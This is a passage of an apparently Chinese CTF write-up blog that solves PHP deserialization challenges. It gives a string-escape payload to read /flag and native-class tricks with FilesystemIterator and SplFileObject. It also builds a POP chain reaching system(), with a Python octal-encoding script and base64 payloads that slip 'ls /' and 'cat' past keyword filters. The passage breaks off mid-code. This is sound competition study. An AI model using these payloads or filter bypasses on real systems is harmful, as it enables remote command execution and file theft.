class=\"headerlink\" title=\"序列化字符串逃逸\"></a>序列化字符串逃逸</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$escape</span>[<span class=\"string\">&#x27;email&#x27;</span>]));</span><br></pre></td></tr></table></figure>\n\n<p>可以知道是让<strong>email的值为flag文件</strong></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/flag/i&quot;</span>,<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;email&#x27;</span>]))</span><br></pre></td></tr></table></figure>\n\n<p>需要绕过正则判断</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">abscond</span>(<span class=\"params\"><span class=\"variable\">$string</span></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$filter</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;NSS&#x27;</span>, <span class=\"string\">&#x27;CTF&#x27;</span>, <span class=\"string\">&#x27;OTL_QAQ&#x27;</span>, <span class=\"string\">&#x27;hello&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$filter</span> = <span class=\"string\">&#x27;/&#x27;</span> . <span class=\"title function_ invoke__\">implode</span>(<span class=\"string\">&#x27;|&#x27;</span>, <span class=\"variable\">$filter</span>) . <span class=\"string\">&#x27;/i&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"variable\">$filter</span>, <span class=\"string\">&#x27;hacker&#x27;</span>, <span class=\"variable\">$string</span>);</span><br></pre></td></tr></table></figure>\n\n<p>看到这里的时候就知道是字符串逃逸了，这里我选择了<strong>字符串增多逃逸</strong></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">escape</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span> = <span class=\"string\">&#x27;OTL&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$phone</span> = [<span class=\"string\">&#x27;123&#x27;</span>, <span class=\"string\">&#x27;666&#x27;</span>];  <span class=\"comment\">// 改为数组</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$email</span> = <span class=\"string\">&#x27;/flag&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$es</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">escape</span>();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$es</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"><span class=\"comment\">//O:6:&quot;escape&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;OTL&quot;;s:5:&quot;phone&quot;;a:2:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;666&quot;;&#125;s:5:&quot;email&quot;;s:5:&quot;/flag&quot;;&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p><code>&quot;;s:5:&quot;phone&quot;;a:2:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;666&quot;;&#125;s:5:&quot;email&quot;;s:5:&quot;/flag&quot;;&#125;</code>是目标字符串长度73</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a=<span class=\"string\">&#x27;hello&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(a*<span class=\"number\">73</span>)</span><br></pre></td></tr></table></figure>\n\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET:</span><br><span class=\"line\">?cata=1</span><br><span class=\"line\"></span><br><span class=\"line\">POST:</span><br><span class=\"line\">name=hellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohello&quot;;s:5:&quot;phone&quot;;a:2:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;666&quot;;&#125;s:5:&quot;email&quot;;s:5:&quot;/flag&quot;;&#125;&amp;phone[]=1&amp;email=1</span><br></pre></td></tr></table></figure>\n\n<p>这种解法与<code>class catalogue</code>关系不大所以cata随便赋值即可</p>\n<h3 id=\"解法二-1\"><a href=\"#解法二-1\" class=\"headerlink\" title=\"解法二\"></a>解法二</h3><h4 id=\"通过php原生类来读取文件\"><a href=\"#通过php原生类来读取文件\" class=\"headerlink\" title=\"通过php原生类来读取文件\"></a>通过php原生类来读取文件</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">catalogue</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$class</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$data</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"class\"><span class=\"keyword\">class</span> = &quot;<span class=\"title\">error</span>&quot;;</span></span><br><span class=\"line\"><span class=\"class\">        $<span class=\"title\">this</span>-&gt;<span class=\"title\">data</span> = &quot;<span class=\"title\">hacker</span>&quot;;</span></span><br><span class=\"line\"><span class=\"class\">    &#125;</span></span><br><span class=\"line\"><span class=\"class\">    <span class=\"title\">public</span> <span class=\"title\">function</span> <span class=\"title\">__destruct</span>()</span></span><br><span class=\"line\"><span class=\"class\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">new</span> <span class=\"variable language_\">$this</span>-&gt;<span class=\"class\"><span class=\"keyword\">class</span>($<span class=\"title\">this</span>-&gt;<span class=\"title\">data</span>);</span></span><br><span class=\"line\"><span class=\"class\">    &#125;</span></span><br><span class=\"line\"><span class=\"class\">&#125;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cata&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/object/i&#x27;</span>,<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cata&#x27;</span>]))&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cata&#x27;</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$cc</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">catalogue</span>();</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$cc</span>));</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>主要用到这两部分</p>\n<p><code>echo new $this-&gt;class($this-&gt;data);</code></p>\n<p>看到这里就可以知道将</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">catalogue</span> </span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"variable\">$class</span> = <span class=\"string\">&#x27;FilesystemIterator&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"variable\">$data</span> = <span class=\"string\">&#x27;glob:///f*&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"string\">&quot;Class: &quot;</span> . <span class=\"variable language_\">$this</span>-&gt;<span class=\"class\"><span class=\"keyword\">class</span> . &quot;, <span class=\"title\">Data</span>: &quot; . $<span class=\"title\">this</span>-&gt;<span class=\"title\">data</span>;</span></span><br><span class=\"line\"><span class=\"class\">&#125;</span></span><br><span class=\"line\"><span class=\"class\">&#125;</span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\">$<span class=\"title\">ca</span> = <span class=\"title\">new</span> <span class=\"title\">catalogue</span>();</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"title\">echo</span> <span class=\"title\">serialize</span>($<span class=\"title\">ca</span>); </span></span><br><span class=\"line\"><span class=\"class\">// <span class=\"title\">O</span>:9:&quot;<span class=\"title\">catalogue</span>&quot;:2:</span>&#123;s:<span class=\"number\">5</span>:<span class=\"string\">&quot;class&quot;</span>;s:<span class=\"number\">18</span>:<span class=\"string\">&quot;FilesystemIterator&quot;</span>;s:<span class=\"number\">4</span>:<span class=\"string\">&quot;data&quot;</span>;s:<span class=\"number\">10</span>:<span class=\"string\">&quot;glob:///f*&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>通过这个查看文件名，看到flag</p>\n<h4 id=\"在通过SplFileObject读取文件内容\"><a href=\"#在通过SplFileObject读取文件内容\" class=\"headerlink\" title=\"在通过SplFileObject读取文件内容\"></a>在通过<strong>SplFileObject读取文件内容</strong></h4><p><code>O:9:&quot;catalogue&quot;:2:&#123;s:5:&quot;class&quot;;s:13:&quot;SplFileObject&quot;;s:4:&quot;data&quot;;s:5:&quot;/flag&quot;;&#125;</code></p>\n<p>由于<code>!preg_match(&#39;/object/i&#39;）</code></p>\n<h4 id=\"手动改链子\"><a href=\"#手动改链子\" class=\"headerlink\" title=\"手动改链子\"></a>手动改链子</h4><blockquote>\n<p>在序列化链子中 S可以识别16进制字符，可以通过这种方式修改链子</p>\n</blockquote>\n<p><code>O:9:&quot;catalogue&quot;:2:&#123;s:5:&quot;class&quot;;S:13:&quot;SplFileO\\62ject&quot;;s:4:&quot;data&quot;;s:5:&quot;/flag&quot;;&#125;</code></p>\n<blockquote>\n<p>\\62是b的ascii形式 </p>\n</blockquote>\n<p>直接读取flag</p>\n<h1 id=\"第四届极客少年挑战赛初赛\"><a href=\"#第四届极客少年挑战赛初赛\" class=\"headerlink\" title=\"第四届极客少年挑战赛初赛\"></a>第四届极客少年挑战赛初赛</h1><h2 id=\"ezunserilize\"><a href=\"#ezunserilize\" class=\"headerlink\" title=\"ezunserilize\"></a>ezunserilize</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"comment\">//you should find flag in you self</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">one</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$a</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">new</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">printf</span>(<span class=\"string\">&quot;i am new baby&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;a-&gt;<span class=\"keyword\">new</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">two</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$func</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$arg</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$func</span>,<span class=\"variable\">$arg</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;func-&gt;arg;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">three</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$kkk</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__get</span>(<span class=\"params\"><span class=\"variable\">$kkk</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;look!you are hero&quot;</span>.<span class=\"variable language_\">$this</span>-&gt;kkk;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">four</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$s</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">eval</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$pattern</span> = <span class=\"string\">&quot;/(ls|c|a|t| |f|i|n|d&#x27;)/&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"variable\">$pattern</span>, <span class=\"variable\">$this</span>-&gt;s)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">print</span>(<span class=\"string\">&quot;oh nonono hacker!&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">system</span>(<span class=\"variable\">$this</span>-&gt;s);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"keyword\">eval</span>();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;aaaa&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">(<span class=\"title function_ invoke__\">unserialize</span>(<span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cmd&#x27;</span>]))); </span><br></pre></td></tr></table></figure>\n\n<p>构造poc</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">one</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$a</span>; <span class=\"comment\">//3 $tw</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">two</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$func</span>; <span class=\"comment\">// 2 $th</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$arg</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">three</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$kkk</span>; <span class=\"comment\">//1 $fo</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">four</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$s</span>=<span class=\"string\">&#x27;$&quot;\\154\\163&quot;&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$o</span> =<span class=\"keyword\">new</span> one;</span><br><span class=\"line\"><span class=\"variable\">$tw</span> =<span class=\"keyword\">new</span> two;</span><br><span class=\"line\"><span class=\"variable\">$th</span>=<span class=\"keyword\">new</span> three;</span><br><span class=\"line\"><span class=\"variable\">$fo</span> = <span class=\"keyword\">new</span> four;</span><br><span class=\"line\"><span class=\"variable\">$th</span>-&gt;kkk=<span class=\"variable\">$fo</span>;</span><br><span class=\"line\"><span class=\"variable\">$tw</span>-&gt; func=<span class=\"variable\">$th</span>;</span><br><span class=\"line\"><span class=\"variable\">$o</span>-&gt;a=<span class=\"variable\">$tw</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$o</span>);</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"解法一：构造八进制命令\"><a href=\"#解法一：构造八进制命令\" class=\"headerlink\" title=\"解法一：构造八进制命令\"></a>解法一：构造八进制命令</h3><p>首先想到的是构造八进制命令</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_oct</span>(<span class=\"params\">c</span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;将字符转换为八进制表示&quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">format</span>(<span class=\"built_in\">ord</span>(c), <span class=\"string\">&#x27;03o&#x27;</span>)  <span class=\"comment\"># 使用03o格式，确保每个字符的八进制表示为三位数</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cmd_to_oct</span>(<span class=\"params\">cmd</span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;将命令字符串转换为八进制转义格式&quot;&quot;&quot;</span></span><br><span class=\"line\">    payload = <span class=\"string\">&quot;$&#x27;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> cmd:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> c == <span class=\"string\">&#x27; &#x27;</span>:</span><br><span class=\"line\">            payload += <span class=\"string\">&quot;&#x27; $&#x27; &quot;</span>  <span class=\"comment\"># 在空格处插入转义表示</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            payload += <span class=\"string\">&quot;\\\\&quot;</span> + get_oct(c)  <span class=\"comment\"># 添加字符的八进制转义表示</span></span><br><span class=\"line\">    payload += <span class=\"string\">&quot;&#x27;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> payload</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 示例用法</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    command = <span class=\"built_in\">input</span>(<span class=\"string\">&quot;请输入要转换的命令: &quot;</span>)  <span class=\"comment\"># 从用户输入获取命令</span></span><br><span class=\"line\">    oct_payload = cmd_to_oct(command)  <span class=\"comment\"># 转换命令</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;转换后的八进制表示:&quot;</span>, oct_payload)  <span class=\"comment\"># 输出转换结果</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"空格替换-t\"><a href=\"#空格替换-t\" class=\"headerlink\" title=\"空格替换\\t\"></a>空格替换\\t</h3><p>但是<strong>ls &#x2F;存在空格</strong>直接拿burp抓包<strong>对其16进制修改</strong></p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20241021191309578.png\" alt=\"image-20241021191309578\"></p>\n<p><strong>将20改为09</strong></p>\n<p>复制payload,进行base64加密</p>\n<h5 id=\"ls\"><a href=\"#ls\" class=\"headerlink\" title=\"ls\t&#x2F;\"></a>ls\t&#x2F;</h5><p><code>O:3:&quot;one&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;two&quot;:2:&#123;s:4:&quot;func&quot;;O:5:&quot;three&quot;:1:&#123;s:3:&quot;kkk&quot;;O:4:&quot;four&quot;:1:&#123;s:1:&quot;s&quot;;s:19:&quot;$&#39;\\154\\163&#39;\t$&#39;\\057&#39;&quot;;&#125;&#125;s:3:&quot;arg&quot;;N;&#125;&#125;</code></p>\n<p>TzozOiJvbmUiOjE6e3M6MToiYSI7TzozOiJ0d28iOjI6e3M6NDoiZnVuYyI7Tzo1OiJ0aHJlZSI6MTp7czozOiJra2siO086NDoiZm91ciI6MTp7czoxOiJzIjtzOjE5OiIkJ1wxNTRcMTYzJwkkJ1wwNTcnIjt9fXM6MzoiYXJnIjtOO319</p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20241021191638803.png\" alt=\"image-20241021191638803\"></p>\n<h5 id=\"cat-4l2g\"><a href=\"#cat-4l2g\" class=\"headerlink\" title=\"cat\t&#x2F;4l2g\"></a><strong>cat\t&#x2F;4l2g</strong></h5><p><code>O:3:&quot;one&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;two&quot;:2:&#123;s:4:&quot;func&quot;;O:5:&quot;three&quot;:1:&#123;s:3:&quot;kkk&quot;;O:4:&quot;four&quot;:1:&#123;s:1:&quot;s&quot;;s:39:&quot;$&#39;\\143\\141\\164&#39;\t$&#39;\\057\\064\\154\\062\\147&#39;&quot;;&#125;&#125;s:3:&quot;arg&quot;;N;&#125;&#125;</code></p>\n<p>TzozOiJvbmUiOjE6e3M6MToiYSI7TzozOiJ0d28iOjI6e3M6NDoiZnVuYyI7Tzo1OiJ0aHJlZSI6MTp7czozOiJra2siO086NDoiZm91ciI6MTp7czoxOiJzIjtzOjM5OiIkJ1wxNDNcMTQxXDE2NCcJJCdcMDU3XDA2NFwxNTRcMDYyXDE0NyciO319czozOiJhcmciO047fX0&#x3D;</p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20241021191944615.png\" alt=\"image-20241021191944615\"></p>\n<blockquote>\n<p>解释为什么不用${IFS}</p>\n<ol>\n<li>牵扯到base64编码</li>\n<li>一些linux并不能识别${IFS}</li>\n</ol>\n</blockquote>\n<h3 id=\"解法二：more绕过\"><a href=\"#解法二：more绕过\" class=\"headerlink\" title=\"解法二：more绕过\"></a>解法二：more绕过</h3><p>直接payload</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span 